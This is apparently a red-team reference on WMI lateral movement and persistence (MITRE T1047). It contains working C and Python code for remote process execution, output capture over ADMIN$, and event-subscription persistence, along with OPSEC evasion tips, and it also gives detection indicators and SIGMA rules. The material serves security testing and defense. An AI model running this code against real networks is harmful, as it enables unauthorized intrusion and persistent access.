# WMI Remote Execution - Implementation Deep-Dive

**MITRE ATT&CK**: T1047 - Windows Management Instrumentation

> **Authorized security testing only.** These code patterns are reference material
> for red team professionals operating under explicit written authorization.

## Overview

Windows Management Instrumentation (WMI) is a built-in management framework that
provides a standardized interface for querying system information and executing
operations across Windows machines. For lateral movement, WMI offers two primary
capabilities: remote process creation via `Win32_Process.Create` and persistent
execution through WMI event subscriptions. WMI execution is appealing because it
uses a trusted Windows subsystem (WmiPrvSE.exe), requires no binary uploads, and
creates no services. The primary challenge is output retrieval -- WMI process creation
is inherently "fire-and-forget," requiring creative solutions to capture command output.

WMI operates over DCOM (TCP 135 + dynamic ports) by default, though WinRM can also
serve as its transport. Understanding the WMI architecture -- from the CIM repository
to WMI providers to the DCOM transport layer -- is essential for both exploiting and
detecting WMI-based lateral movement.

## WMI Architecture

```
  WMI Architecture Overview
  =========================

  Client (Attacker)                    Target Machine
  +------------------+                 +-------------------------------+
  |                  |  DCOM/RPC       |  WMI Service (Winmgmt)        |
  | IWbemLocator     |  TCP 135 +      |  +---------------------------+|
  |   .ConnectServer |  dynamic ports  |  | CIM Repository            ||
  |                  |---------------->|  | (C:\Windows\System32\     ||
  | IWbemServices    |                 |  |  wbem\Repository\)        ||
  |   .ExecMethod    |                 |  | Contains: class defs,     ||
  |   .ExecQuery     |                 |  | namespace hierarchy,      ||
  |   .CreateInstance|                 |  | static instances          ||
  |                  |                 |  +---------------------------+|
  +------------------+                 |                               |
                                       |  WMI Provider Host            |
                                       |  (WmiPrvSE.exe)               |
                                       |  +---------------------------+|
                                       |  | Providers:                ||
                                       |  |  Win32_Process            ||
                                       |  |  Win32_Service            ||
                                       |  |  __EventFilter            ||
                                       |  |  ActiveScriptEventConsumer||
                                       |  |  CommandLineEventConsumer ||
                                       |  +---------------------------+|
                                       |             |                 |
                                       |             v                 |
                                       |  cmd.exe / powershell.exe     |
                                       |  (spawned by WmiPrvSE.exe)    |
                                       +-------------------------------+

  Key Process Chain:
    svchost.exe (WinMgmt service)
      -> WmiPrvSE.exe (WMI Provider Host)
           -> cmd.exe (process created by Win32_Process.Create)

  DETECTION: WmiPrvSE.exe spawning cmd.exe or powershell.exe
             is the primary process-based detection indicator.
```

## Win32_Process.Create - Remote Process Execution

```
  Win32_Process.Create Method
  ===========================

  Input Parameters:
    CommandLine  (string)  - Command to execute
    CurrentDirectory (string) - Working directory (optional)
    ProcessStartupInformation (Win32_ProcessStartup) - Optional

  Return Value:
    ReturnValue  (uint32)  - 0 = success, others = error code
    ProcessId    (uint32)  - PID of created process

  The method is "fire-and-forget": it creates the process and
  returns immediately. There is NO built-in mechanism to capture
  stdout/stderr or wait for process completion.

  Output Capture Solutions:
    1. Redirect to file:  cmd.exe /c whoami > C:\Windows\Temp\out.txt
       Then read via SMB:  type \\target\C$\Windows\Temp\out.txt
    2. Write to registry:  cmd.exe /c whoami | reg add HKLM\...
    3. Store in WMI class: Create a custom WMI class, store output
       as a property, query it back over WMI
    4. Reverse connection:  Launch a reverse shell or C2 callback
```

## WMI Event Subscription Persistence

```
  WMI Event Subscription Anatomy
  ================================

  Three components required (the "evil triad"):

  +-------------------+     +----------------------+     +---------------------------+
  | __EventFilter     |     | __FilterToConsumer-  |     | __EventConsumer            |
  |                   |     |  Binding             |     | (CommandLineEventConsumer  |
  | Query: SELECT *   |---->| Filter: ref to       |---->|  or ActiveScript)          |
  |  FROM __Instance- |     |  EventFilter         |     |                            |
  |  ModificationEvent|     | Consumer: ref to     |     | CommandLineTemplate:       |
  |  WITHIN 60        |     |  EventConsumer       |     |  "cmd.exe /c <payload>"    |
  |  WHERE Target-    |     |                      |     |                            |
  |  Instance ISA     |     +----------------------+     +---------------------------+
  |  'Win32_Local-    |
  |  Time' AND Target-|     When the EventFilter's WQL query matches,
  |  Instance.Hour=8  |     the binding routes the event to the consumer,
  +-------------------+     which executes the specified command.

  DETECTION:
    - Sysmon Event 19: WmiEventFilter activity
    - Sysmon Event 20: WmiEventConsumer activity
    - Sysmon Event 21: WmiEventConsumerToFilter activity
    - WMI-Activity/Operational log (Microsoft-Windows-WMI-Activity)
    - Permanent subscriptions survive reboot -> persistence indicator
```

## C Implementation - WMI via IWbemServices COM Interface

```c
#include <windows.h>
#include <wbemidl.h>
#include <stdio.h>

#pragma comment(lib, "wbemuuid.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")

/*
 * WMI Remote Process Execution via IWbemServices COM Interface
 *
 * PURPOSE: Demonstrate the native COM interface for WMI remote
 *          execution. This is what tools like wmiexec and Impacket's
 *          wmiexec.py use under the hood.
 *
 * ARCHITECTURE:
 *   1. CoInitializeEx: Initialize COM (MTA for DCOM)
 *   2. CoInitializeSecurity: Set DCOM authentication
 *   3. CoCreateInstance IWbemLocator: Create the WMI locator
 *   4. IWbemLocator::ConnectServer: Connect to remote WMI namespace
 *   5. CoSetProxyBlanket: Set authentication on the proxy
 *   6. IWbemServices::ExecMethod: Call Win32_Process.Create
 *
 * DETECTION ARTIFACTS:
 *   - Sysmon Event 1: WmiPrvSE.exe spawning child process on target
 *   - Event 4688: Process creation with WmiPrvSE.exe parent
 *   - Event 4648: Explicit credential usage (if alternate creds used)
 *   - WMI-Activity/Operational: WMI method invocation logged
 *   - Network: DCOM traffic (TCP 135 + dynamic ports) to target
 *   - Sysmon Event 3: Network connection from attacker machine
 *
 * OPSEC CONSIDERATIONS:
 *   - WmiPrvSE.exe as parent process is well-known to EDRs
 *   - WMI activity is extensively logged in WMI-Activity log
 *   - No binary dropped to disk (advantage over PsExec)
 *   - No service created (advantage over PsExec/smbexec)
 *   - Output capture requires side-channel (file, registry, etc.)
 *   - Consider WinRM transport as alternative to DCOM
 */

/*
 * wmi_exec_process - Execute a process on a remote machine via WMI
 *
 * Parameters:
 *   target      - Remote hostname or IP (e.g., L"192.168.1.50")
 *   domain      - Domain name (e.g., L"CORP")
 *   username    - Username for authentication
 *   password    - Password (or use current token if NULL)
 *   commandline - Command to execute on target
 *
 * Returns:
 *   0 on success, -1 on failure
 */
int wmi_exec_process(
    LPCWSTR target,
    LPCWSTR domain,
    LPCWSTR username,
    LPCWSTR password,
    LPCWSTR commandline)
{
    HRESULT hr;

    /* --------------------------------------------------------
     * STEP 1: Initialize COM runtime.
     * Must use COINIT_MULTITHREADED for DCOM remote calls.
     *
     * DETECTION: No artifact from COM initialization.
     * -------------------------------------------------------- */
    hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (FAILED(hr)) {
        printf("[!] CoInitializeEx failed: 0x%08lx\n", hr);
        return -1;
    }

    /* --------------------------------------------------------
     * STEP 2: Set process-wide COM security.
     * RPC_C_AUTHN_LEVEL_PKT_PRIVACY encrypts all DCOM traffic.
     * This is important because credentials and commands travel
     * over the wire in the DCOM calls.
     *
     * OPSEC: Using PKT_PRIVACY (encrypted) makes network
     *   inspection harder for defenders but is also the default
     *   for authenticated DCOM. Using lower levels may actually
     *   stand out as unusual.
     * -------------------------------------------------------- */
    hr = CoInitializeSecurity(
        NULL,                          /* pSecDesc */
        -1,                            /* cAuthSvc */
        NULL,                          /* asAuthSvc */
        NULL,                          /* pReserved1 */
        RPC_C_AUTHN_LEVEL_PKT_PRIVACY, /* Encrypt DCOM traffic */
        RPC_C_IMP_LEVEL_IMPERSONATE,   /* Impersonation level */
        NULL,                          /* pAuthList */
        EOAC_NONE,                     /* dwCapabilities */
        NULL                           /* pReserved3 */
    );

    /* --------------------------------------------------------
     * STEP 3: Create IWbemLocator instance.
     * IWbemLocator is the entry point for WMI -- it provides
     * ConnectServer to establish a connection to a WMI namespace.
     *
     * DETECTION: No remote artifact; this is local COM activation.
     * -------------------------------------------------------- */
    IWbemLocator *pLocator = NULL;
    hr = CoCreateInstance(
        &CLSID_WbemLocator,         /* rclsid */
        NULL,                         /* pUnkOuter */
        CLSCTX_INPROC_SERVER,        /* dwClsCtx - in-process */
        &IID_IWbemLocator,           /* riid */
        (LPVOID *)&pLocator          /* ppv */
    );
    if (FAILED(hr)) {
        printf("[!] CoCreateInstance(WbemLocator) failed: 0x%08lx\n", hr);
        CoUninitialize();
        return -1;
    }

    /* --------------------------------------------------------
     * STEP 4: Connect to the remote WMI namespace.
     * The namespace path format is: \\SERVER\root\cimv2
     *
     * root\cimv2 is the default namespace containing Win32_*
     * classes (Win32_Process, Win32_Service, etc.).
     *
     * DETECTION: This initiates the DCOM connection:
     *   - TCP 135 connection to target (RPC Endpoint Mapper)
     *   - Dynamic port allocation for WMI traffic
     *   - Authentication events on target (Event 4624 Type 3)
     *   - WMI-Activity/Operational log entry on target
     * -------------------------------------------------------- */
    IWbemServices *pServices = NULL;
    WCHAR namespace_path[256];
    swprintf_s(namespace_path, 256, L"\\\\%s\\root\\cimv2", target);

    hr = pLocator->lpVtbl->ConnectServer(
        pLocator,
        namespace_path,        /* strNetworkResource */
        (BSTR)username,        /* strUser (NULL = current token) */
        (BSTR)password,        /* strPassword */
        NULL,                  /* strLocale */
        0,                     /* lSecurityFlags */
        (BSTR)domain,          /* strAuthority (domain name) */
        NULL,                  /* pCtx */
        &pServices             /* ppNamespace - output */
    );
    if (FAILED(hr)) {
        printf("[!] ConnectServer failed: 0x%08lx\n", hr);
        pLocator->lpVtbl->Release(pLocator);
        CoUninitialize();
        return -1;
    }

    /* --------------------------------------------------------
     * STEP 5: Set authentication on the proxy.
     * CoSetProxyBlanket configures the DCOM proxy with the
     * authentication credentials to use for subsequent calls.
     *
     * Without this step, method calls may fail with
     * E_ACCESSDENIED because the proxy defaults to the
     * process-level security, which may not have the right
     * credentials for the remote namespace.
     *
     * DETECTION: No additional artifact from this call.
     * -------------------------------------------------------- */
    hr = CoSetProxyBlanket(
        (IUnknown *)pServices,           /* pProxy */
        RPC_C_AUTHN_WINNT,               /* dwAuthnSvc (NTLMSSP) */
        RPC_C_AUTHZ_NONE,                /* dwAuthzSvc */
        NULL,                            /* pServerPrincName */
        RPC_C_AUTHN_LEVEL_PKT_PRIVACY,   /* dwAuthnLevel */
        RPC_C_IMP_LEVEL_IMPERSONATE,     /* dwImpLevel */
        NULL,                            /* pAuthInfo */
        EOAC_NONE                        /* dwCapabilities */
    );

    /* --------------------------------------------------------
     * STEP 6: Get the Win32_Process class definition.
     * We need the class object to set up the input parameters
     * for the Create method.
     *
     * DETECTION: WMI class access logged in WMI-Activity log.
     * -------------------------------------------------------- */
    IWbemClassObject *pClass = NULL;
    BSTR class_name = SysAllocString(L"Win32_Process");

    hr = pServices->lpVtbl->GetObject(
        pServices,
        class_name,     /* strObjectPath */
        0,              /* lFlags */
        NULL,           /* pCtx */
        &pClass,        /* ppObject */
        NULL            /* ppCallResult */
    );
    SysFreeString(class_name);

    /* --------------------------------------------------------
     * STEP 7: Get the Create method's input parameter class.
     * Win32_Process::Create takes a CommandLine parameter.
     * We need to create an instance of the input parameter
     * class and populate it with our command.
     *
     * DETECTION: No additional artifact from parameter setup.
     * -------------------------------------------------------- */
    IWbemClassObject *pInParamsDefinition = NULL;
    BSTR method_name = SysAllocString(L"Create");

    hr = pClass->lpVtbl->GetMethod(
        pClass,
        method_name,             /* wszName - method name */
        0,                       /* lFlags */
        &pInParamsDefinition,    /* ppInSignature - input params class */
        NULL                     /* ppOutSignature */
    );

    /* Create an instance of the input parameters */
    IWbemClassObject *pInParams = NULL;
    hr = pInParamsDefinition->lpVtbl->SpawnInstance(
        pInParamsDefinition, 0, &pInParams
    );

    /* Set the CommandLine parameter */
    VARIANT vt_cmd;
    VariantInit(&vt_cmd);
    vt_cmd.vt = VT_BSTR;
    vt_cmd.bstrVal = SysAllocString(commandline);

    hr = pInParams->lpVtbl->Put(
        pInParams,
        L"CommandLine",    /* wszName */
        0,                 /* lFlags */
        &vt_cmd,           /* pVal */
        0                  /* Type */
    );
    VariantClear(&vt_cmd);

    /* --------------------------------------------------------
     * STEP 8: Execute Win32_Process::Create.
     * THIS is the critical moment -- this call creates a
     * process on the remote machine.
     *
     * DETECTION (on target machine):
     *   - Sysmon Event 1: New process with parent WmiPrvSE.exe
     *   - Event 4688: Process creation event
     *     ParentProcessName: C:\Windows\System32\wbem\WmiPrvSE.exe
     *     NewProcessName: C:\Windows\System32\cmd.exe
     *     CommandLine: <our command>
     *   - WMI-Activity/Operational: Method execution logged
     *   - If AMSI is enabled: script content may be scanned
     *
     * OPSEC: The full command line is visible in Event 4688.
     *   Consider using encoded commands or indirect execution
     *   (e.g., cmd.exe /c "payload" where payload is staged).
     * -------------------------------------------------------- */
    IWbemClassObject *pOutParams = NULL;
    hr = pServices->lpVtbl->ExecMethod(
        pServices,
        SysAllocString(L"Win32_Process"),  /* strObjectPath */
        method_name,                        /* strMethodName */
        0,                                  /* lFlags */
        NULL,                               /* pCtx */
        pInParams,                          /* pInParams */
        &pOutParams,                        /* ppOutParams */
        NULL                                /* ppCallResult */
    );

    if (SUCCEEDED(hr)) {
        /* Check return value (0 = success) */
        VARIANT vt_ret;
        VariantInit(&vt_ret);
        pOutParams->lpVtbl->Get(pOutParams, L"ReturnValue", 0,
                                &vt_ret, NULL, NULL);
        printf("[+] Win32_Process.Create returned: %ld\n", vt_ret.lVal);

        /* Get the PID of the created process */
        VARIANT vt_pid;
        VariantInit(&vt_pid);
        pOutParams->lpVtbl->Get(pOutParams, L"ProcessId", 0,
                                &vt_pid, NULL, NULL);
        printf("[+] Remote process PID: %ld\n", vt_pid.lVal);

        VariantClear(&vt_ret);
        VariantClear(&vt_pid);
    } else {
        printf("[!] ExecMethod(Create) failed: 0x%08lx\n", hr);
    }

    /* Cleanup */
    if (pOutParams) pOutParams->lpVtbl->Release(pOutParams);
    pInParams->lpVtbl->Release(pInParams);
    pInParamsDefinition->lpVtbl->Release(pInParamsDefinition);
    SysFreeString(method_name);
    pClass->lpVtbl->Release(pClass);
    pServices->lpVtbl->Release(pServices);
    pLocator->lpVtbl->Release(pLocator);
    CoUninitialize();

    return SUCCEEDED(hr) ? 0 : -1;
}
```

## Python Implementation - WMI Remote Execution

```python
"""
WMI Remote Execution via Python.

Two approaches demonstrated:
  1. Native Python wmi module (requires pywin32)
  2. Impacket's wmiexec-style approach (DCOM-based, with output capture)

DETECTION: Identical artifacts to any WMI execution:
  - WmiPrvSE.exe spawning child processes
  - WMI-Activity/Operational log entries
  - DCOM network traffic (TCP 135 + dynamic)
  - Event 4688 process creation with WmiPrvSE.exe parent

OPSEC NOTES:
  - The python.exe process on the attacker machine initiates DCOM
  - Full command line is logged in Event 4688 on target
  - WMI event subscriptions are persistent and survive reboots
  - WMI activity is one of the more heavily logged subsystems
"""

import sys


# ============================================================
# Method 1: Python wmi Module (Win32_Process.Create)
# ============================================================

def wmi_exec_native(target: str, username: str, password: str,
                     command: str) -> dict:
    """
    Execute a command on a remote machine via WMI Win32_Process.Create.

    Uses the Python wmi module (wrapper around COM automation).
    Requires pywin32 and wmi packages.

    This is the simplest WMI execution method but has NO output
    capture -- it's fire-and-forget. The process is created on
    the target and returns immediately with the PID.

    Args:
        target: Remote hostname or IP
        username: Username for authentication (DOMAIN\\user format)
        password: Password
        command: Command line to execute

    Returns:
        dict with 'return_value' and 'process_id'

    Detection:
        - Event 4688: Process creation, parent WmiPrvSE.exe
        - Sysmon Event 1: Process creation with full command line
        - WMI-Activity/Operational: Method invocation
    """
    import wmi

    # Connect to the remote WMI namespace root\cimv2
    # The wmi module uses COM automation (IDispatch) under the hood,
    # which in turn uses DCOM for remote connections.
    #
    # DETECTION: DCOM connection initiation:
    #   - TCP 135 to target (RPC Endpoint Mapper)
    #   - Event 4624 Type 3 (Network logon) on target
    #   - WMI-Activity log entry for namespace connection
    connection = wmi.WMI(
        computer=target,
        user=username,
        password=password,
        namespace="root\\cimv2"
    )

    # Call Win32_Process.Create
    # This invokes IWbemServices::ExecMethod on the remote machine.
    #
    # DETECTION MOMENT: Process creation on target
    #   - WmiPrvSE.exe spawns the command
    #   - Full command line visible in Event 4688
    #   - Sysmon Event 1 captures hashes, parent PID, etc.
    process_startup = connection.Win32_ProcessStartup.new()
    process_startup.ShowWindow = 0  # SW_HIDE - hidden window

    # Create method returns (ReturnValue, ProcessId)
    # ReturnValue: 0=success, 2=access denied, 3=insufficient privilege,
    #              8=unknown failure, 9=path not found, 21=invalid parameter
    result = connection.Win32_Process.Create(
        CommandLine=command,
        ProcessStartupInformation=process_startup
    )

    return_value = result[0]
    process_id = result[1]

    return {
        'return_value': return_value,
        'process_id': process_id,
        'success': return_value == 0
    }


# ============================================================
# Method 2: WMI Execution with Output Capture
# ============================================================

def wmi_exec_with_output(target: str, username: str, password: str,
                          command: str) -> str:
    """
    Execute command via WMI with output capture.

    The core problem with WMI execution is that Win32_Process.Create
    does not return stdout/stderr. Impacket's wmiexec solves this by:

      1. Creating the process with output redirected to a temp file:
         cmd.exe /Q /c <command> > \\127.0.0.1\ADMIN$\Temp\output.txt 2>&1

      2. Reading the output file back via SMB (ADMIN$ share)

      3. Deleting the output file

    This approach requires SMB access in addition to WMI access.

    Alternative output methods:
      - Store output in registry (reg add HKLM\...\key /v data /d "output")
      - Store output in a WMI class property (custom class)
      - Use a reverse connection instead (C2 callback)

    OPSEC NOTES:
      - Output file is written to disk (briefly) on the target
      - SMB access to ADMIN$ is required for output retrieval
      - File creation and deletion generate Sysmon Event 11/26
      - The output file path is predictable and may be monitored
      - Consider randomizing the output filename
    """
    import wmi
    import os
    import tempfile
    import time

    # Generate random filename for output
    # OPSEC: Use random names to avoid signature-based detection
    # of known temp file patterns (e.g., "__output" used by wmiexec.py)
    output_filename = f"wmi_{os.urandom(4).hex()}.tmp"
    output_path = f"C:\\Windows\\Temp\\{output_filename}"

    # Wrap command with output redirection
    # /Q = quiet mode (no echo), /c = execute and terminate
    # 2>&1 captures both stdout and stderr
    wrapped_cmd = f'cmd.exe /Q /c {command} > {output_path} 2>&1'

    connection = wmi.WMI(
        computer=target,
        user=username,
        password=password
    )

    # Execute with output redirection
    result = connection.Win32_Process.Create(CommandLine=wrapped_cmd)

    if result[0] != 0:
        return f"Error: Win32_Process.Create returned {result[0]}"

    # Wait for process to complete
    # OPSEC: Polling introduces a timing pattern. Consider
    # monitoring the process PID via WMI for completion.
    time.sleep(2)

    # Read output via SMB (requires ADMIN$ access)
    # UNC path: \\target\ADMIN$\Temp\output_filename
    smb_output_path = f"\\\\{target}\\ADMIN$\\Temp\\{output_filename}"

    try:
        with open(smb_output_path, 'r') as f:
            output = f.read()

        # Clean up the output file
        # OPSEC: Always clean up artifacts. Leaving output files
        # on target is a forensic indicator.
        os.remove(smb_output_path)

        return output.strip()

    except FileNotFoundError:
        return "Error: Output file not found (command may still be running)"
    except PermissionError:
        return "Error: Cannot access ADMIN$ share for output retrieval"


# ============================================================
# Method 3: WMI Event Subscription (Persistence)
# ============================================================

def create_wmi_subscription(target: str, username: str, password: str,
                              filter_name: str, consumer_name: str,
                              command: str, trigger_query: str) -> bool:
    """
    Create a WMI event subscription for persistence.

    WMI event subscriptions consist of three components:
      1. __EventFilter: WQL query that defines the trigger condition
      2. __EventConsumer: Action to take (CommandLineEventConsumer)
      3. __FilterToConsumerBinding: Links filter to consumer

    Common trigger queries:
      - Timer-based:
        SELECT * FROM __InstanceModificationEvent WITHIN 60
        WHERE TargetInstance ISA 'Win32_LocalTime'
        AND TargetInstance.Hour = 8 AND TargetInstance.Minute = 0

      - Process-based:
        SELECT * FROM __InstanceCreationEvent WITHIN 10
        WHERE TargetInstance ISA 'Win32_Process'
        AND TargetInstance.Name = 'explorer.exe'

      - Startup-based:
        SELECT * FROM __InstanceModificationEvent WITHIN 60
        WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'

    DETECTION:
      - Sysmon Event 19: WmiEventFilter activity (filter creation)
      - Sysmon Event 20: WmiEventConsumer activity (consumer creation)
      - Sysmon Event 21: WmiEventConsumerToFilter (binding creation)
      - WMI-Activity/Operational log: subscription creation
      - Persistent WMI subscriptions are visible via:
        Get-WMIObject -Namespace root\Subscription -Class __EventFilter
        Get-WMIObject -Namespace root\Subscription -Class __EventConsumer
        Get-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding

    OPSEC:
      - Subscriptions survive reboots (persistence mechanism)
      - Well-known to forensic analysts and incident responders
      - Sysmon Events 19/20/21 specifically target this technique
      - Consider using it only when other persistence mechanisms
        are not available, as it is increasingly well-monitored

    Args:
        target: Remote hostname or IP
        username: Authentication username
        password: Authentication password
        filter_name: Name for the event filter
        consumer_name: Name for the event consumer
        command: Command to execute when triggered
        trigger_query: WQL query for the trigger condition
    """
    import wmi

    # Connect to root\subscription namespace
    # This is the namespace where event subscriptions are stored.
    # It's separate from root\cimv2 where Win32_* classes live.
    connection = wmi.WMI(
        computer=target,
        user=username,
        password=password,
        namespace="root\\subscription"
    )

    # Step 1: Create the EventFilter
    # The WQL query defines WHEN the action triggers.
    # __InstanceModificationEvent WITHIN <poll_interval>
    # polls the CIM repository every <poll_interval> seconds.
    #
    # DETECTION: Sysmon Event 19 fires when this is created.
    event_filter = connection.__EventFilter.SpawnInstance_()
    event_filter.Name = filter_name
    event_filter.QueryLanguage = "WQL"
    event_filter.Query = trigger_query
    event_filter.EventNamespace = "root\\cimv2"
    event_filter.put()
    print(f"[+] Created EventFilter: {filter_name}")

    # Step 2: Create the EventConsumer
    # CommandLineEventConsumer executes a command line when triggered.
    # Alternative: ActiveScriptEventConsumer (runs VBScript/JScript)
    #
    # DETECTION: Sysmon Event 20 fires when this is created.
    consumer = connection.CommandLineEventConsumer.SpawnInstance_()
    consumer.Name = consumer_name
    consumer.CommandLineTemplate = command
    consumer.put()
    print(f"[+] Created CommandLineEventConsumer: {consumer_name}")

    # Step 3: Create the FilterToConsumerBinding
    # This links the filter to the consumer. Without this binding,
    # the filter and consumer exist but are not connected.
    #
    # DETECTION: Sysmon Event 21 fires when this is created.
    binding = connection.__FilterToConsumerBinding.SpawnInstance_()
    binding.Filter = event_filter.path_.Path
    binding.Consumer = consumer.path_.Path
    binding.put()
    print(f"[+] Created FilterToConsumerBinding")

    return True


def remove_wmi_subscription(target: str, username: str, password: str,
                              filter_name: str, consumer_name: str) -> bool:
    """
    Remove a WMI event subscription (cleanup after engagement).

    IMPORTANT: Always clean up WMI subscriptions after an engagement.
    Leaving active subscriptions is both unprofessional and creates
    ongoing risk for the client.

    Order matters: remove binding first, then consumer and filter.
    """
    import wmi

    connection = wmi.WMI(
        computer=target,
        user=username,
        password=password,
        namespace="root\\subscription"
    )

    # Remove binding first
    for binding in connection.__FilterToConsumerBinding():
        if filter_name in str(binding.Filter):
            binding.Delete_()
            print(f"[+] Removed binding")

    # Remove consumer
    for consumer in connection.CommandLineEventConsumer():
        if consumer.Name == consumer_name:
            consumer.Delete_()
            print(f"[+] Removed consumer: {consumer_name}")

    # Remove filter
    for event_filter in connection.__EventFilter():
        if event_filter.Name == filter_name:
            event_filter.Delete_()
            print(f"[+] Removed filter: {filter_name}")

    return True


# ============================================================
# Usage Examples (educational)
# ============================================================

if __name__ == '__main__':
    print("[*] WMI Remote Execution - Educational Reference")
    print()
    print("[*] Method 1: Win32_Process.Create (fire-and-forget)")
    print("    + No binary upload, no service creation")
    print("    - No output capture without side-channel")
    print("    Detection: WmiPrvSE.exe parent, Event 4688, WMI-Activity")
    print()
    print("[*] Method 2: WMI + SMB output capture")
    print("    + Full command output retrieval")
    print("    - Requires SMB access (ADMIN$)")
    print("    - Temp file written to disk (forensic artifact)")
    print("    Detection: File creation + WMI activity")
    print()
    print("[*] Method 3: WMI Event Subscription (persistence)")
    print("    + Survives reboots")
    print("    + No user interaction required")
    print("    - Heavily monitored (Sysmon 19/20/21)")
    print("    - Well-known to incident responders")
    print("    Detection: Sysmon 19/20/21, WMI-Activity log")
    print()
    print("[*] WMI-Activity Operational Log Location:")
    print("    Microsoft-Windows-WMI-Activity/Operational")
    print("    Applications and Services Logs > Microsoft >")
    print("    Windows > WMI-Activity > Operational")
```

## Detection Indicators

### Process-Based Detection

| Indicator | Source | Description |
|-----------|--------|-------------|
| WmiPrvSE.exe -> cmd.exe | Sysmon 1 / Event 4688 | WMI Provider Host spawning command shell |
| WmiPrvSE.exe -> powershell.exe | Sysmon 1 / Event 4688 | WMI spawning PowerShell |
| scrcons.exe -> cmd.exe | Sysmon 1 / Event 4688 | ActiveScriptEventConsumer executing command |
| wmiprvse.exe unusual child | EDR behavioral | Any unexpected child of WMI Provider Host |

### WMI-Specific Event Log Detection

| Event | Log | Description |
|-------|-----|-------------|
| Sysmon Event 19 | Sysmon | WmiEventFilter creation (subscription trigger) |
| Sysmon Event 20 | Sysmon | WmiEventConsumer creation (subscription action) |
| Sysmon Event 21 | Sysmon | WmiEventConsumerToFilter binding (subscription link) |
| Event 5857 | WMI-Activity/Operational | WMI provider loaded (wmiprvse.exe loading provider DLL) |
| Event 5858 | WMI-Activity/Operational | WMI query error (useful for failed attempts) |
| Event 5860 | WMI-Activity/Operational | WMI temporary event subscription |
| Event 5861 | WMI-Activity/Operational | WMI permanent event subscription |

### Network-Based Detection

| Indicator | Source | Description |
|-----------|--------|-------------|
| TCP 135 + dynamic ports | Firewall / IDS | DCOM/RPC traffic pattern for WMI |
| WBEM DCOM traffic | Network monitor | WMI-specific DCOM endpoint traffic |
| Unusual RPC source | SIEM correlation | Non-management workstation initiating RPC to servers |

### SIGMA Rule Example

```yaml
title: WMI Remote Process Creation
status: stable
logsource:
    product: windows
    category: process_creation
detection:
    selection:
        ParentImage|endswith: '\WmiPrvSE.exe'
        Image|endswith:
            - '\cmd.exe'
            - '\powershell.exe'
            - '\pwsh.exe'
            - '\rundll32.exe'
            - '\regsvr32.exe'
            - '\mshta.exe'
    condition: selection
level: high
tags:
    - attack.execution
    - attack.t1047
---
title: WMI Permanent Event Subscription
status: experimental
logsource:
    product: windows
    category: wmi_event
detection:
    selection:
        EventID:
            - 19  # WmiEventFilter
            - 20  # WmiEventConsumer
            - 21  # WmiEventConsumerToFilter
    condition: selection
level: critical
tags:
    - attack.persistence
    - attack.t1546.003
```

## Cross-References

- [WMI Lateral Movement - Technique Narrative](../../09-lateral-movement/wmi-lateral.md)
- [DCOM Execution (this directory)](dcom-execution.md)
- [PsExec / SMBExec](../../09-lateral-movement/psexec-smbexec.md)
- [WinRM Lateral Movement](../../09-lateral-movement/winrm-lateral.md)
- [Pass the Hash (this directory)](pth-implementation.md)
- [Persistence Techniques](../../04-persistence/README.md)
